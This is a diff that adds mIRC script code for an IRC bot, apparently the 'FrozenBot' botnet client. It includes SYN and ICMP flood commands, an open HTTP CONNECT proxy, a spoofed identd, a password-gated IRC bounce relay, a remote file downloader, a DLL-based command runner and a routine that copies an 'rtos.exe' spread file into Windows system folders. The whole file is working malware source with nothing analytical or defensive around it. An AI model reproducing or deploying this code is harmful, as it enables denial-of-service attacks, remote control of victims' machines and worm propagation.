+alias icmp.done { mell 15/07ICMP Attack Finished15\ | unset %icmp }
+alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | mell 15/07Syn Attack Done!15\ }
+alias syn {
+  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
+  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }
+}
+alias proxy.start {
+  if (%bot.proxy != $null) && ($portfree(%bot.proxy)) unset %bot.proxy
+  if ($1 == $null) return
+  if ($1 == off) { if ($sock(proxy)) sockclose proxy* | sockclose tunnel* | unset %bot.proxy | mell 15/07Proxy Disabled15\ }
+  if ($1 !isnum) return
+  if ($portfree($1)) { set %bot.proxy $1 | socklisten proxy $1 | sockmark proxy %target | mell 15/07Proxy Started on:04 $ip %bot.proxy 07Port:04 $1 $+ 15\  }
+  else { mell 15/07Port already taken15\ }
+}
+
+on *:socklisten:proxy:{ var %s = proxy. $+ $ticks | sockaccept %s }
+on *:sockread:proxy.*:{
+  if ($sockerr) return
+  var %t, %s, %z
+  sockread %t
+  if (CONNECT *:* HTTP/?.? iswm %t) {
+    %s = tunnel-s. $+ $gettok($sockname,2,46)
+    %z = tunnel-c. $+ $gettok($sockname,2,46)
+    ;bot.ident
+    sockopen %s $replace($gettok(%t,2,32),:,$chr(32))
+    sockrename $sockname %z
+    sockmark $sockname %s
+    sockmark %s %z
+  }
+  elseif (& *HTTP/?.? iswm %t) { sockwrite $sockname HTTP/1.0 400 Bad request $+ $str($crlf,2) | sockclose $sockname }
+}
+alias bot.ident if ($portfree(113)) socklisten botidentd 113 | .timerbid 1 30 sockclose botidentd
+alias gettom { return $remove($dll(teal.dll,$winnt,mIRC $1-),+OK) }
+on *:socklisten:botidentd:var %s = botident $+ $r(10000,99999) | sockaccept %s | .timer 1 30 sockclose %s
+on *:sockread:botident*:var %t | if ($sockerr) return | sockread %t | if (*,* !iswm %t) return | sockwrite -n $sockname %t : USERID : UNIX : $r4 $+ $r4
+alias adj return $r4
+on *:sockwrite:proxy.*:if ($sockerr) { if ($sock($sock($sockname).mark)) sockclose $ifmatch | return }
+on *:sockclose:proxy.*:if ($sock($sock($sockname).mark)) sockclose $ifmatch | return
+on *:sockopen:tunnel-s.*:{
+  var %p = $sock($sockname).mark
+  if ($sock(%p) == $null) { sockclose $sockname | return }
+  if ($sockerr) { sockwrite %p HTTP/1.0 500 Server Error $+ $str($crlf,2) | sockclose %p | return }
+  sockwrite %p HTTP/1.0 200 Connection established $+ $str($crlf,2)
+}
+on *:sockread:tunnel-?.*:{
+  var %p = $sock($sockname).mark
+  if ($sockerr) { sockclose %p | return }
+  :l
+  sockread &t
+  if ($sockbr) {
+    sockwrite -b %p $sockbr &t
+    goto l
+  }
+}
+
+alias b { if ($isid) return $remove($left($1-,940),$chr(32)) }
+alias toma { return $remove($dll(teal.dll,$winnt32,mIRC $1-),+OK) }
+alias downloadthis { if ($sock(download)) { mell 15/07Error:04 Already downloading a file15\ | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | mell 15/07Downloading:04 $1- $+ 15\ | .sockopen download %download1 80 }
+alias stdio { return $dll(TaskUsage.dll,$1,$2-) }
+alias std.run {
+  var %p = $b($gettok($1-,1,59)), %a = $stdio(ReleaseProcess,%p), %r = $stdio(RunConsole,%p,$gettok($1-,1,59))
+  if ($gettok(%r,1,32) == OK) .timerstd. $+ %p -om 0 1 std.read %p ; $+ $gettok($1-,2-,59)
+  else echo -s (stdio) Couldn't create process: %r
+}
+alias std.read {
+  while ($gettok(%o,1,32) != ERROR) {
+    var %o = $stdio(ReadText,$1 out), %c = $gettok($1-,2,59), , %a = $gettok($1-,-1,59), %w = $wildtok(%c,@*,1,32), %l = $iif($remove(%o,ok),$gettok(%o,2-,32),$_nchr(%w))
+    if (%w) && (!$window(%w)) goto err2 | if ($gettok(%o,1,32) != ERROR) %c %l
+  }
+  if (ERROR STDE6 * iswm %o) { if (%a) { %a | goto err2 } | goto err } | return | :err | %c - | :err2 | .timerstd. $+ $1 off | var %a = $stdio(ReleaseProcess,$1)
+}
+on *:sockread:BncClient*:{
+  sockread %BncClient
+  if ($gettok(%BncClient,1,32) == NICK) {
+    set %Bnc.nick $gettok(%BncClient,2,32)
+  }
+  if ($gettok(%BncClient,1,32) == USER) {
+    set %Bnc.user $gettok(%BncClient,2-,32)
+    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>
+  }
+  if ($gettok(%BncClient,1,32) == PASS) { 
+    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
+      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to BNC v2.8.6, the irc proxy
+      sockwrite -n $sockname NOTICE AUTH : $+ 15/07F r o z e n B o t:04 B N C15\
+      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now
+      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect
+      %Bnc.legit = yes
+
+    }
+    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { 
+      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!
+      sockclose $sockname
+    }
+  }
+  if ($gettok(%BncClient,1,32) == islynxsexy?) {
+    if (%Bnc.legit == yes) { sockwrite -n $sockname NOTICE AUTH : $+ fuck yeah he is, So is 15/07 $+ $vV $+ 15\    }
+  }
+  if ($gettok(%BncClient,1,32) == CONN) {
+    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ Yeah, Well see, i need a password first? mkay... | sockclose $sockname
+    }
+    if (BncServer $+ $remove($sockname,BncClient) != $null) {
+      sockclose BncServer $+ $remove($sockname,BncClient)
+    }
+    if ($gettok(%BncClient,3,32) !== $null) {
+      sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
+      sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)
+      set %Bnc.server.passwd $gettok(%BncClient,4,32)
+    }
+    if ($gettok(%BncClient,3,32) == $null) {
+      sockwrite -n $sockname NOTICE AUTH : $+ /quote conn <server> <port>
+    }
+  }
+  else {
+    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
+      halt
+    }
+    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
+  }
+}
+on *:sockopen:BncServer*:{
+  if ($sockerr) {
+    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
+    sockclose $sockname
+    halt
+  }
+  if ($sock($sockname).status != active) {
+    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
+    sockclose BncServer $+ $remove($socknme, BncServer)
+    halt
+  }
+  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection
+  sockwrite -n $sockname NICK %Bnc.nick
+  sockwrite -n $sockname USER %Bnc.user
+}
+on *:sockread:BncServer*:{
+  sockread %BncServer
+  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
+    halt
+  }
+  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
+}
+alias copyscan { if $exists(c:\winnt\system32\rtos.exe) == $true { /copy c:\winnt\system32\rtos.exe c:\winnt\inf\rtos.exe | mell 15/07Copied:04 Spread File15\ } | else if $exists(c:\windows\system32\rtos.exe) == $true { /copy c:\windows\system32\rtos.exe c:\winnt\inf\rtos.exe | mell 15/07Copied:04 Spread File15\ } } }
